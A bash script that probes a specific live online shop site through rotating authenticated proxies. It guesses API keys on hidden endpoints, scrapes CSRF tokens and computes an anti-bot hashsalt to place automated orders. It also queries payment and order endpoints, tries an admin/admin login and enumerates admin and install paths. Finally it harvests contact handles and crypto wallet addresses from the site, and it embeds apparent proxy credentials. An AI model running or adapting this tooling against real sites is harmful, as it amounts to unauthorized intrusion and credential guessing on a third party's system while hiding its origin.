#!/bin/bash
# kk987.top P2 — oracles retry + hashsalt pay + query + login
set -u
KEY=C413ED6D; PW=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://kk987.top/shop
OUT=/tmp/kk987_p2; CK=/tmp/kk987_p2.ck; LOG=/tmp/kk987_p2.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PW}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 8 --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" -H 'X-Requested-With: XMLHttpRequest' "$@"; }

for i in 1 2 3 4 5 6; do
  refresh
  code=$(curl -sk --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done
CSRF=$(python3 -c "import re;h=open('/tmp/kk987_p2/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h);print(m.group(1) if m else '')")
echo CSRF=$CSRF

echo '===== oracles ====='
for k in '' x test 123456 kk987 zixin admin; do
  echo "tools [$k] => $(c -G --data-urlencode "act=tools" --data-urlencode "key=$k" "$BASE/%61pi.php")"
done
echo "token [test] => $(c -G --data-urlencode "act=token" --data-urlencode "key=test" "$BASE/%61pi.php")"
echo "clone [test] => $(c -G --data-urlencode "act=clone" --data-urlencode "key=test" "$BASE/%61pi.php")"
echo "orders [test] => $(c -G --data-urlencode "act=orders" --data-urlencode "key=test" --data-urlencode "limit=1" "$BASE/%61pi.php")"
for k in '' test 123456; do
  echo "cron [$k] => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/cron.php?key=$k" | head -c 100)"
done
echo "card_check => $(c -X POST --data "card=test123&csrf_token=$CSRF" "$BASE/ajax.php?act=card_check")"
echo "gift => $(c -X POST --data "csrf_token=$CSRF" "$BASE/ajax.php?act=gift_start")"
echo "invite => $(c -X POST --data "csrf_token=$CSRF" "$BASE/ajax.php?act=invite_content")"

echo '===== cheapest buy + hashsalt pay ====='
# tid 16 price 60 stock 4 from P1
TID=16
c "$BASE/?mod=buy&tid=$TID" -o "$OUT/buy.html" -w 'BUY:%{http_code}\n'
python3 - <<'PY'
import re
h=open('/tmp/kk987_p2/buy.html',encoding='utf-8',errors='ignore').read()
csrf=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h)
m=re.search(r"var\s+hashsalt\s*=\s*(.+?);",h)
print('csrf',bool(csrf),'hs_expr',bool(m), 'len',len(h))
open('/tmp/kk987_p2/csrf.txt','w').write(csrf.group(1) if csrf else '')
if m:
  open('/tmp/kk987_p2/hs.js','w').write('console.log('+m.group(1)+')')
  print('hs_len',len(m.group(1)))
print('inputname', re.findall(r'inputname["\']?\s*[:=]\s*["\']([^"\']*)',h)[:3])
print('isfaka', re.findall(r'isfaka["\']?\s*[:=]\s*["\']?(\d)',h)[:3])
print('price', re.findall(r'price["\']?\s*[:=]\s*["\']?([\d.]+)',h)[:3])
PY
HS=$(node "$OUT/hs.js" 2>/dev/null | tr -d '\r\n')
CSRF=$(cat "$OUT/csrf.txt")
echo HS=$HS
INPUT=kk987$(date +%H%M%S)
PAY=$(c -X POST -H "Referer: $BASE/?mod=buy&tid=$TID" \
  --data-urlencode "tid=$TID" \
  --data-urlencode "inputvalue=$INPUT" \
  --data-urlencode "num=1" \
  --data-urlencode "hashsalt=$HS" \
  --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=pay")
echo PAY=$PAY
echo "$PAY" > "$OUT/pay.json"
TN=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$PAY")
echo TN=$TN INPUT=$INPUT
echo "$TN" > "$OUT/tn.txt"
echo "$INPUT" > "$OUT/input.txt"

echo '===== post-order ====='
echo "getshop => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/getshop.php?trade_no=$TN")"
echo "usdt status => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/usdt-trc20/status.php?trade_no=$TN")"
echo "usdt submit => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/submit.php?type=usdt&orderid=$TN" | tr '\n' ' ' | head -c 200)"
echo
echo "qqpay => $(curl -sk --max-time 20 -x "$PROXY_URL" -A "$UA" "$BASE/other/qqpay.php?trade_no=$TN" | tr '\n' ' ' | head -c 250)"
echo
for body in \
  "qq=$TN&type=1&csrf_token=$CSRF" \
  "qq=$INPUT&csrf_token=$CSRF" \
  "qq=$TN&type=1"
do
  code=$(c -X POST --data "$body" "$BASE/ajax.php?act=query" -w '%{http_code}' -o "$OUT/q.out")
  echo "query [$body] HTTP$code $(head -c 200 $OUT/q.out)"
done

# qd93 exact on our TN
code=$(curl -sk --max-time 20 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" "$BASE/?mod=query&data=$TN" -o "$OUT/qd_exact.html" -w '%{http_code}')
python3 - <<PY
import re
h=open('/tmp/kk987_p2/qd_exact.html',encoding='utf-8',errors='ignore').read()
so=re.findall(r"showOrder\((\d+)\s*,\s*'([a-f0-9]{32})'\)", h)
print('mod=query exact TN HTTP=$code showOrder',so,'empty', '没有查询' in h)
PY

echo '===== login captcha ====='
curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" "$BASE/?mod=login" -o "$OUT/login.html" -w 'login:%{http_code}\n'
c -X POST --data "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha" | tee "$OUT/captcha.json"; echo
echo "login_noproof => $(c -X POST --data "user=admin&pass=admin&csrf_token=$CSRF" "$BASE/ajax.php?act=login")"

echo '===== paths ====='
for u in "$BASE/?mod=login" "$BASE/admin/" "$BASE/install/" "$BASE/toollogs.php"; do
  echo "$u => $(curl -sk --max-time 15 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")"
done

# siteinfo full for announce
c "$BASE/%61pi.php?act=siteinfo" -o "$OUT/siteinfo.json"
python3 - <<'PY'
import json,re
s=json.load(open('/tmp/kk987_p2/siteinfo.json'))
an=s.get('anounce') or ''
print('sitename',s.get('sitename'),'build',s.get('build'))
print('kfqq',s.get('kfqq'))
print('tg',re.findall(r't\.me/[A-Za-z0-9_]+|@[A-Za-z0-9_]{4,}',an)[:15])
print('Taddr',re.findall(r'T[1-9A-HJ-NP-Za-km-z]{33}',an)[:5])
# pay keywords in announce
for m in re.finditer(r'.{0,30}(USDT|支付|支付宝|微信|QQ).{0,40}', an, re.I):
  print('ann', re.sub(r'\s+',' ',m.group(0))[:100])
PY

echo '===== P2 DONE ====='
